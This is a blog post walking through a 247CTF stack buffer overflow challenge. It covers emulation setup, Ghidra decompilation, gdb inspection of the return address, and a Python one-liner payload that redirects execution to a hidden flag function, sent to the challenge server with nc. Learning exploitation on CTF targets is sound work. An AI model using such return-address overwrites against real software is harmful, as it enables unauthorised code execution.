---
layout: post
title: Tackling the Buffer Overflow
categories: pwn 247ctf
tags: buffer-overflow
---

# Introduction
I always kept a distance to buffer overflows. Maybe they're too scary? I don't know.  
But you've got to learn new things, so here we go:

# Hidden Flag Function
> Can you control this applications flow to gain access to the hidden flag function?

Let's run `file` over it:
```
file hidden_flag_function
hidden_flag_function: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=92825cdfbc5b108fc4cfe56d7c6636f837475d4e, not stripped
```

Okay, good it's not stripped. The problem: it's i386. Let's fire up qemu?

Qemu is split into two modes: full system emulation and user mode emulation. While we needed for the Bootloader reversing the system emulator, we only need to run a simple program here.  
I only got qemu system installed, but apparently there is no qemu-user for windows. Good thing I have WSL...

To install qemu user we only need:
```
sudo apt-get install qemu-user
```
Running it "transparently" means running it like a native executable with `./executable`. This works through binfmt (which is kinda cool).

I was following [this](https://ownyourbits.com/2018/06/13/transparently-running-binaries-from-any-architecture-in-linux-with-qemu-and-binfmt_misc/) as a reference, but `./hidden_flag_function` didn't work.  
```
./hidden_flag_function
-bash: ./hidden_flag_function: cannot execute binary file: Exec format error
```
`qemu-i386 hidden_flag_function` also gave a dependency error...
```
qemu-i386 hidden_flag_function
/lib/ld-linux.so.2: No such file or directory
```

To fix this I found [this](https://stackoverflow.com/a/49405982).
TL;DR:
```
sudo apt install qemu-user-static
sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic '\x7fELF\x01\x01\x01\x03\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00' --mask '\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xf8\xff\xff\xff\xff\xff\xff\xff'

sudo dpkg --add-architecture i386
sudo apt update
sudo apt install g++:i386
```

It gave some errors, but I can finally run the program.

Let's look at the program in Ghidra:
```c++
undefined4 main(void)
{
  undefined *puVar1;
  
  puVar1 = &stack0x00000004;
  setbuf(stdout,(char *)0x0);
  puts("What do you have to say?");
  chall(puVar1);
  return 0;
}
```
So it calls chall():
```c++
void chall(void)
{
  int iVar1;
  undefined local_4c [68];
  
  iVar1 = __x86.get_pc_thunk.ax();
  __isoc99_scanf(iVar1 + 0x133,local_4c);
  return;
}
```

Okay, so I've never done this, but I now how it works in theory.  
Also [here](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/) a guide kinda thingy?  
As it doesn't call any other function, we probably have to overwrite the return address (which is thrown onto the stack %ebp).  
The input is saved in eax + 0x133.
0x133 / 0x4 (char size) = 0x4C = 76

The flag function is at 0x08048576:
```c++
void flag(void)
{
  char local_50 [64];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  fgets(local_50,0x40,local_10);
  printf("How did you get here?\nHave a flag!\n%s\n",local_50);
  return;
}
```

So we need to insert `0x76 0x85 0x04 0x08` into $ebp, so we can "return" to the flag function. 

If we break at 0x80485fa (directly after ) with gdb by running `qemu-i386-static -g 1234 hidden_flag_function`, we can print out %ebp:
```
(gdb) target remote localhost:1234
(gdb) break *0x80485fa
(gdb) layout asm
(gdb) layout regs
(gdb) c
...
(gdb) x/8xb $ebp
0xffffdd78:     0x88    0xdd    0xff    0xff    0x4a    0x86    0x04    0x08
```
So $ebp+4 is the return address.

We can also see this better:
```
(gdb) x/a $ebp+4
0xffffdd7c:     0x804864a
```

The code at the address is:
```
0804864a    b8 00 00 00 00     MOV     EAX,0x0
```

Let's do a buffer overflow:
```
python -c "print('a'*78+'\x76\x85\x04\x08')" | qemu-i386-static -g 1234 hidden_flag_function
```

If we look at this in gdb:
```
(gdb) x/s $ebp
0xffffdd78:     "aaaaaav\205\004\b"

(gdb) x/8xb $ebp
0xffffdd78:     0x61    0x61    0x61    0x61    0x61    0x61    0x76    0x85
```

Okay so we need two chars less, so the final command is:
```
python -c "print('a'*76+'\x76\x85\x04\x08')" | ./hidden_flag_function
What do you have to say?
How did you get here?
Have a flag!
gottem
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
Segmentation fault (core dumped)
```

Now let's send that to the server:
```
python -c "print('a'*76+'\x76\x85\x04\x08')" | nc <IP> <PORT>
What do you have to say?
How did you get here?
Have a flag!
247CTF{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

And we done did it.